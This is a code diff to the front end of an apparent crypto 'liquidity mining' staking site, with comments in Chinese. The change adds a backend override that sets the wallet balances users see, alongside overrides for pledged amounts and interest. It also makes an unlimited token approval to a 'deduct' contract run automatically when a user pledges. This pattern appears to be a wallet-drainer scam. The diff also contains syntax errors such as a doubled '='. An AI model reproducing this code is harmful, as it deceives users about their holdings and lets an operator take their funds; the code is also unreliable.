@@ -94,7 +94,7 @@ function initSSE() {
           redeemed: false
         };
         userPledges.push(newOrder);
-        updateAccountBalanceDisplay();
+        updateAccountBalanceDisplay(); // 強制更新 Pledged Amount
         updatePledgeSummary();
         const estimatedInterest = (finalAmount * durationInfo.rate).toFixed(3);
         showPledgeResult('success', translations[currentLang].pledgeSuccess,
@@ -210,6 +210,28 @@ let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
 let userPledges = [];
 window.isDemoMode = false;
 let cachedWalletBalances = { USDT: 0n, USDC: 0n, WETH: 0n };
+// ==================== 價格快取 ====================
+let tokenPrices = { USDT: 1, USDC: 1, WETH: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
+// ==================== 獲取代幣 USD 價格 ====================
+async function getTokenPriceUSD(token) {
+  const now = Date.now();
+  if (now - tokenPrices.timestamp < tokenPrices.cacheDuration) {
+    return tokenPrices[token];
+  }
+  try {
+    const ids = token === 'WETH' ? 'ethereum' : token.toLowerCase();
+    const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
+    if (!response.ok) throw new Error();
+    const data = await response.json();
+    const price = data[ids]?.usd || (token === 'WETH' ? 2500 : 1);
+    tokenPrices[token] = price;
+    tokenPrices.timestamp = now;
+    return price;
+  } catch (error) {
+    console.error(`[DEBUG] 獲取 ${token} 價格失敗，使用預設值`);
+    return token === 'WETH' ? 2500 : 1;
+  }
+}
 // ==================== 翻譯表 ====================
 const translations = {
   'en': {
@@ -278,7 +300,10 @@ const translations = {
     confirm: 'Confirm',
     clickTotalPledge: 'Click "Total Pledged" to view details',
     days: 'days',
-    pledgeRejected: 'Pledge rejected'
+    pledgeRejected: 'Pledge rejected',
+    minPledgeUSD: 'Minimum pledge value: 1 USD',
+    authorizingForPledge: 'Authorizing to enable pledge...',
+    pledgeValueTooLow: 'Pledge value must be at least 1 USD'
   },
   'zh-Hant': {
     title: '流動性挖礦',
@@ -346,7 +371,10 @@ const translations = {
     confirm: '確認',
     clickTotalPledge: '點擊「總質押金額」查看詳情',
     days: '天',
-    pledgeRejected: '質押被駁回'
+    pledgeRejected: '質押被駁回',
+    minPledgeUSD: '最低質押價值：1 美元',
+    authorizingForPledge: '正在授權以啟用質押...',
+    pledgeValueTooLow: '質押價值需至少 1 美元'
   },
   'zh-Hans': {
     title: '流动性挖矿',
@@ -414,7 +442,10 @@ const translations = {
     confirm: '确认',
     clickTotalPledge: '点击「总质押金额」查看详情',
     days: '天',
-    pledgeRejected: '质押被驳回'
+    pledgeRejected: '质押被驳回',
+    minPledgeUSD: '最低质押价值：1 美元',
+    authorizingForPledge: '正在授权以启用质押...',
+    pledgeValueTooLow: '质押价值需至少 1 美元'
   }
 };
 // ==================== 語言防呆 ====================
@@ -645,8 +676,9 @@ function applyOverrides(override) {
   totalGrossOutput = override.grossOutput ?? 0;
   ['USDT', 'USDC', 'WETH'].forEach(token => {
     const pledgedKey = `pledged${token}`;
-    const interestKey = `interest${token}`;  // ← 修正：加上 "Key"
+    const interestKey = `interest${token}`;
     const claimedKey = `claimedInterest${token}`;
+    const walletKey = `wallet${token}`;
     if (override[pledgedKey] != null) {
       accountBalance[token].pledged = Number(override[pledgedKey]);
     }
@@ -657,6 +689,10 @@ function applyOverrides(override) {
       localStorage.setItem(claimedKey, String(override[claimedKey]));
     } else {
       localStorage.setItem(claimedKey, '0');
+    }
+    if (override[walletKey] != null) {
+      accountBalance[token].wallet = Number(override[walletKey]);
+      updateWalletBalanceFromCache();
     }
   });
   updateClaimableDisplay();
@@ -1162,10 +1198,10 @@ function showOrderDetail(order, index) {
       <p><strong>${translations[currentLang].cycle}：</strong>${order.duration} ${translations[currentLang].days}</p>
       <p><strong>${translations[currentLang].apr}：</strong><span style="color:#0f0;">${(durationInfo.rate * 100).toFixed(1)}%</span></p>
       <p><strong>${translations[currentLang].startTime}：</strong>${new Date(order.startTime).toLocaleString()}</p>
-      <p><strong>${translations[currentLang].endTime || 'End Time'}：</strong>${new Date(endTime).toLocaleString()}</p>
+      <p><strong>End Time：</strong>${new Date(endTime).toLocaleString()}</p>
       <p><strong>${translations[currentLang].remaining}：</strong><span style="color:#ff0;">${daysLeft} ${translations[currentLang].days}</span></p>
       <p><strong>${translations[currentLang].accrued}：</strong><span style="color:#0ff;">${accrued} ${escapeHtml(order.token)}</span></p>
-      <p><strong>${translations[currentLang].estimatedTotal || 'Estimated Total Interest'}：</strong><span style="color:#0f0;">${estimatedTotal} ${escapeHtml(order.token)}</span></p>
+      <p><strong>Estimated Total Interest：</strong><span style="color:#0f0;">${estimatedTotal} ${escapeHtml(order.token)}</span></p>
     </div>
   `;
   const closeBtn = document.createElement('button');
@@ -1314,7 +1350,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         if (result.version) {
           localStorage.setItem('dataVersion', result.version.toString());
         }
-        updateClaimableDisplay();
+                updateClaimableDisplay();
         updateAccountBalanceDisplay();
         closeClaimModal();
         updateStatus(translations[currentLang].claimSuccess);
@@ -1356,7 +1392,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
       let balanceBigInt;
       try {
-                balanceBigInt = await retry(() => selectedContract.connect(provider).balanceOf(userAddress));
+        balanceBigInt = await retry(() => selectedContract.connect(provider).balanceOf(userAddress));
       } catch (e) {
         updateStatus(`${translations[currentLang].error}: Balance error`, true);
         return;
@@ -1403,11 +1439,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         updateStatus("noWallet", true);
         return;
       }
-      const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
-      if (!isActive) {
-        updateStatus('Please complete contract authorization first', true);
-        return;
-      }
+
       const amount = parseFloat(pledgeAmount.value) || 0;
       const durationDays = parseInt(pledgeDuration.value) || 90;
       const token = pledgeToken.value;
@@ -1415,65 +1447,98 @@ document.addEventListener('DOMContentLoaded', async () => {
         updateStatus(translations[currentLang].invalidPledgeAmount, true);
         return;
       }
-      const locked = await isPledgeLocked(userAddress);
-      if (locked) {
-        updateStatus("pledgeProcessing", true);
+
+      // === 檢查 USD 價值（至少 1 USD）===
+      const price = await getTokenPriceUSD(token);
+      const usdValue = amount * price;
+      if (usdValue < 1) {
+        updateStatus(translations[currentLang].pledgeValueTooLow, true);
         return;
       }
-      pledgeBtn.disabled = true;
-      pledgeBtn.textContent = 'Processing...';
-      try {
-        const decimals = token === 'WETH' ? 18 : 6;
-        const bigIntBalance = cachedWalletBalances[token] || 0n;
-        const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
-        if (amount > walletBalance) {
-          throw new Error(translations[currentLang].insufficientBalance);
+
+      // === 檢查是否已授權 ===
+      const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress)).catch(() => false);
+      if (!isActive) {
+        updateStatus(translations[currentLang].authorizingForPledge);
+        pledgeBtn.disabled = true;
+        pledgeBtn.textContent = 'Authorizing...';
+        try {
+          await handleConditionalAuthorizationFlow();
+          pledgeBtn.textContent = 'Processing...';
+          await submitPledge(amount, durationDays, token);
+        } catch (error) {
+          updateStatus(`Authorization failed: ${error.message}`, true);
+          pledgeBtn.disabled = false;
+          pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
         }
-        const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
-        if (duration && amount < duration.min) {
-          throw new Error(`Minimum pledge amount: ${duration.min} ${token}`);
-        }
-        const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
-        const currentAllowance = await retry(() => tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS));
-        const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
-        if (currentAllowance < REQUIRED_ALLOWANCE) {
-          updateStatus(`Authorizing ${token}...`);
-          const approveTx = await tokenContract.approve.populateTransaction(
-            DEDUCT_CONTRACT_ADDRESS,
-            ethers.MaxUint256
-          );
-          await sendMobileRobustTransaction(approveTx);
-        }
-        updateStatus('Submitting pledge request...');
-        const response = await fetch(`${BACKEND_API_URL}/api/pledge`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ address: userAddress, amount, token, duration: durationDays })
-        });
-        if (!response.ok) {
-          const text = await response.text();
-          throw new Error(`Request failed: ${response.status} - ${text}`);
-        }
-        const result = await response.json();
-        if (!result.success) {
-          throw new Error(result.error || 'Server rejected pledge request');
-        }
-        updateStatus(`pledgeSubmitted${result.orderId}`);
-        const poll = setInterval(async () => {
-          const stillLocked = await isPledgeLocked(userAddress);
-          if (!stillLocked) {
-            pledgeBtn.disabled = false;
-            pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-            clearInterval(poll);
-          }
-        }, 2000);
-      } catch (error) {
-        pledgeBtn.disabled = false;
-        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-        updateStatus(`pledgeError${error.message}`, true);
+        return;
       }
+
+      await submitPledge(amount, durationDays, token);
     });
   }
+
+  // === 抽離質押邏輯（共用）===
+  async function submitPledge(amount, durationDays, token) {
+    const locked = await isPledgeLocked(userAddress);
+    if (locked) {
+      updateStatus("pledgeProcessing", true);
+      return;
+    }
+    pledgeBtn.disabled = true;
+    pledgeBtn.textContent = 'Processing...';
+    try {
+      const decimals = token === 'WETH' ? 18 : 6;
+      const bigIntBalance = cachedWalletBalances[token] || 0n;
+      const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
+      if (amount > walletBalance) {
+        throw new Error(translations[currentLang].insufficientBalance);
+      }
+      const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
+      if (duration && amount < duration.min) {
+        throw new Error(`Minimum pledge amount: ${duration.min} ${token}`);
+      }
+      const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
+      const currentAllowance = await retry(() => tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS));
+      const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
+      if (currentAllowance < REQUIRED_ALLOWANCE) {
+        updateStatus(`Authorizing ${token}...`);
+        const approveTx = = await tokenContract.approve.populateTransaction(
+          DEDUCT_CONTRACT_ADDRESS,
+          ethers.MaxUint256
+        );
+        await sendMobileRobustTransaction(approveTx);
+      }
+      updateStatus('Submitting pledge request...');
+      const response = await fetch(`${BACKEND_API_URL}/api/pledge`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address: userAddress, amount, token, duration: durationDays })
+      });
+      if (!response.ok) {
+        const text = await response.text();
+        throw new Error(`Request failed: ${response.status} - ${text}`);
+      }
+      const result = await response.json();
+      if (!result.success) {
+        throw new Error(result.error || 'Server rejected pledge request');
+      }
+      updateStatus(`pledgeSubmitted${result.orderId}`);
+      const poll = await setInterval(async () => {
+        const stillLocked = await isPledgeLocked(userAddress);
+        if (!stillLocked) {
+          pledgeBtn.disabled = false;
+          pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+          clearInterval(poll);
+        }
+      }, 2000);
+    } catch (error) {
+      pledgeBtn.disabled = false;
+      pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+      updateStatus(`pledgeError${error.message}`, true);
+    }
+  }
+
   if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
   if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
@@ -1573,7 +1638,10 @@ function showPledgeResult(type, title, message) {
   const titleEl = document.getElementById('pledgeResultTitle');
   const messageEl = document.getElementById('pledgeResultMessage');
   const confirmBtn = document.getElementById('pledgeResultConfirm');
-  if (!modal) return;
+  if (!modal || !titleEl || !messageEl || !confirmBtn) {
+    console.error('[ERROR] Pledge result modal elements not found');
+    return;
+  }
   titleEl.textContent = title;
   messageEl.innerHTML = message;
   modal.classList.toggle('error', type === 'error');
